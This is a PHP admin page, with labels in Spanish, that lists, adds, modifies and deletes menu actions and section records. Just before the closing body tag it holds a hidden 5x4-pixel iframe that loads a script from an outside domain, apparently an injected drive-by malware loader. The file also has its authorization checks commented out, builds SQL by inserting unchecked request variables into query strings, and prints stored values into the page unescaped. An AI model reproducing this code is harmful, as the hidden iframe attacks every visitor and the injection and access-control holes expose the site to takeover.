<?php
	define ('CFG_section_id','eb6fa68c571ab79ee58cac010917c642');
	include_once('../inc/conf.inc.php');

//	authorization('') !== false ? '' : die('permiso denegado');

	$secciones = new DBI;
	$subsecciones = new DBI;
	$resultados = new DBI;
?>
<html>
<head>
	<title>Secciones</title>
	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
	<link rel="stylesheet" href="../<?=CFG_styleDir.CFG_styleFile?>" type="text/css">
    <link rel="stylesheet" href="../styles/tabla.css" type="text/css">
	<script src="<?=CFG_jsPath?>download.php"></script>
</head>

<body id="body">
<?php //Nodos
	if ($action == 'Agregar') {
		$db->insert (CFG_actionsTable , "nombre,nota,padre");
		$action = '';
		$action2 = 'actualizar_menu';
	}//end 'Agregar'
	
	if ($action == 'Modificar') {
		$db->update (CFG_actionsTable, "nombre,nota,padre" , "nombre = '$id_accion'");
		$db->update (CFG_actionsTable, "padre = '$nombre'" , "padre = '$id_accion'");
		$db->update (CFG_privilegesTable, "accion = '$nombre'" , "accion = '$id_accion'");
		$action='';
		$action2 = 'actualizar_menu';
	}//end 'Modificar'
	
	if ($action == 'Borrar') {
		$db->delete (CFG_actionsTable, "nombre = '$id_accion'");
		$db->select (CFG_actionsTable, "*","padre = '$id_accion'");
		$acciones_sql = '';
		$coma = '';
		while ($accion = $db->fetch_object()) {
			$acciones_sql .= "$coma '$accion->nombre'";
			$coma=', ';
		}
		$acciones_sql .= "$coma '$id_accion'";
		$db->delete (CFG_actionsTable, "padre = '$id_accion'");
		$db->delete (CFG_privilegesTable, "accion IN ($acciones_sql)");
		$action = '';
		$action2 = 'actualizar_menu';
	}//end 'Borrar'
?>
<?php //Items
	if ($action == 'Agregar_item') {
		$secciones->sql="
			INSERT INTO ".CFG_sectionsTable." (nombre,vinculo,id_padre)
			VALUES ('$nombre','$vinculo',$id_padre)
		";
		$secciones->query();
		
		$action = 'frmItems';
		$action2 = 'actualizar_menu';
		$id_seccion = $id_padre;
	}//end 'Agregar_item'
	
	if ($action == 'ModificarItem') {
		$db->update(CFG_sectionsTable, "nombre,vinculo,id_padre" , "id = $id");
		$action='frmItems';
		$action2 = 'actualizar_menu';
		$id_seccion = $id_padre;
	}//end 'Modificar_item'
	
	if ($action == 'Borrar_item') {
		$db->delete(CFG_sectionsTable,"id = $id_seccion");
/*		$secciones->sql="
			DELETE FROM ".CFG_sectionsTable."
			WHERE id = $id_seccion
		";*/
		$secciones->query();
		
		$action='frmItems';
		$action2 = 'actualizar_menu';
		$id_seccion=$id_padre;
	}//end 'Borrar_item'
?>
<?php
/*echo "->".$action;
echo "-->".(authorization($action)?"si":"no");*/
//	if ( authorization($action) == '' ) {
	if ( $action == '' ) {
			$db->select(
			CFG_actionsTable,
			"*",
			"",
			"nombre,padre"
		);
?>
<table align="center" width="600" cellpadding="3" cellspacing="0" border="0">
	<tr>
		<td class="relieve" colspan="5">
			<table width="100%" border="0" cellspacing="0" cellpadding="3">
				<form name="frm_agregar" method="post" action="<?=$PHP_SELF?>">
					<input type="hidden" name="action" value="frmAgregar">
				</form>
				<tr>
					<td>
						<input type="button" value="Agregar Accion" onClick="frm_agregar.submit()" class="button">
					</td>
					<td align="right" class="text">Total: <?=$db->num_rows()?></td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td height="5" colspan="5" class="sombra_titulo"></td>
	</tr>
	<tr><td height="5" colspan="5"></td></tr>
	<tr align="center">
		<td class="relieve" width="130">Nombre</td>
		<td class="relieve" width="130">Padre</td>
		<td class="relieve" width="210">Nota</td>
		<td class="relieve" width="60">Modificar</td>
		<td class="relieve" width="40">Borrar</td>
	</tr>
<?
		if ($db->num_rows() < 1) {
?>
	<tr>
		<td colspan="5" align="center" class="relieve"><font color="#FF0000">No se encontro ningún registro</font></td>
	</tr>
<?
		} else {
			while ($accion = $db->fetch_object()) {
				$n++;
				$color = ($color=='#6699CC')?'#336699':'#6699CC';
?>
	<tr bgcolor="<?=$color?>">
		<td class="relieve" valign="top" width="130"><?=printif($accion->nombre)?></td>
		<td class="relieve" valign="top" width="130"><?=printif($accion->padre)?></td>
		<td class="relieve" valign="top" width="210"><?=printif(nl2br($accion->nota))?></td>
		<td class="relieve" align="center" width="60">
			<a href="<?=$PHP_SELF?>?id_accion=<?=$accion->nombre?>&action=frmModificar"><img src="<?=CFG_imgPath?>list.gif" border="0" /></a>
		</td>
		<td class="relieve" align="center" width="40">
			<a href="<?=$PHP_SELF?>?id_accion=<?=$accion->nombre?>&action=frmBorrar"><img src="<?=CFG_imgPath?>delete.gif" border="0" /></a>
		</td>
	</tr>
<?
			}
		}
?>
</table>
<br>
<br>
<?
	}
//	if ( in( authorization($action), 'frmAgregar', 'frmModificar')  ) {
	if ( in( $action, 'frmAgregar', 'frmModificar')  ) {
		if ($action == 'frmModificar') {
			$seccion = DBI::record(CFG_actionsTable," nombre = '$id_accion'");
		}
?>
<form name="form1" method="post" action="<?=$PHP_SELF?>">
	<input type="hidden" name="action" value="<?=($action == 'frmAgregar' ? 'Agregar' : 'Modificar')?>" />
	<input type="hidden" name="id_accion" value="<?=$id_accion?>" />
	<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
		<tr align="center">
			<th height="29" colspan="2" class="relieve">
				<span class="texto_titulo"><?=($action == 'frmAgregar' ? 'Agregar' : 'Modificar')?> Acci&oacute;n</span>
			</th>
		</tr>
		<tr align="center">
			<td width="172" class="relieve">Nombre</td>
			<td width="226" class="relieve"><input type="text" name="nombre" value="<?=$seccion->nombre?>" style="width:90% " /></td>
		</tr>
		<tr align="center">
			<td width="172" class="relieve">Nota</td>
			<td width="226" class="relieve"><textarea name="nota" id="nota" style="width:90% "><?=$seccion->nota?></textarea></td>
		</tr>
		<tr align="center">
			<td width="172" class="relieve">Padre</td>
			<td width="226" class="relieve">
<?
			Widgets::dbCombo (
				'padre',//id
				DBI::select (
					CFG_actionsTable,
					'nombre,nombre',
					null,
					'nombre'
				),//source
				$seccion->padre,//selected
				array ('' => '-- Acciones'),//options
				'90%',//width
				 '',//onchange
				 '',//alttext
				 true,//autoshow
				 '',//class
				 '',//html
				 ''//validate
			) ;
?>
			</td>
		</tr>
		<tr align="center">
			<td colspan="2" class="relieve" align="center">
				<input type="submit" class="button" value="<?=($action == 'frmAgregar' ? 'Agregar' : 'Modificar')?>" name="submit" />
				<input type="button" class="button" value="Cancelar" name="Button" onClick="javascript: open ('<?=$PHP_SELF?>','main','');" />
			</td>
		</tr>
	</table>
</form>
<?
	}
	if($action=='frmBorrar'){
		$accion = DBI::record(CFG_actionsTable,"nombre = '$id_accion'");
?>
<form name="form1" method="post" action="<?=$PHP_SELF?>">
	<table width="398" border="0" cellspacing="0" cellpadding="0" align="center">
		<tr align="center"> 
			<th class="relieve" height="31" colspan="2" bgcolor="#305280"><span class="texto_titulo">Borrar Acción </span></th>
		</tr>
		<tr align="center"> 
			<td width="199" align="left" bgcolor="#6699CC" class="relieve"> Nombre </td>
			<td width="210" align="left" bgcolor="#6699CC" class="relieve"> <?=$accion->nombre?></td>
		</tr>
		<tr align="left"> 
			<td width="199" bgcolor="#6699CC" class="relieve"> Nota </td>
			<td width="210" bgcolor="#6699CC" class="relieve"> <?=printif(nl2br($accion->nota))?></td>
		</tr>
		<tr align="left"> 
			<td width="199" bgcolor="#6699CC" class="relieve"> Padre </td>
			<td width="210" bgcolor="#6699CC" class="relieve"> <?=printif($accion->padre)?></td>
		</tr>
		<tr align="center"> 
			<td colspan="2" class="relieve" bgcolor="#336699"> <center>
				<input type="hidden" name="id_accion" value="<?=$id_accion?>">
				<input type="hidden" name="action" value="Borrar">
				<input type="submit" class="button" value="Borrar" name="action">
				<input type="button" class="button" value="Cancelar" name="Button" onClick="javascript:location = '<?=$PHP_SELF?>'">
			</center></td>
		</tr>
	</table>
</form>
<?
	}
?>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
<?php
	if ($action2 == 'actualizar_menu') {
?>
<script language="JavaScript" type="text/javascript">
<!--
	download ('menu.php' , function (s){ top.document.getElementById ('menu').innerHTML = s});
//-->
</script>
<?php
		$action2 = '';
	}
?>
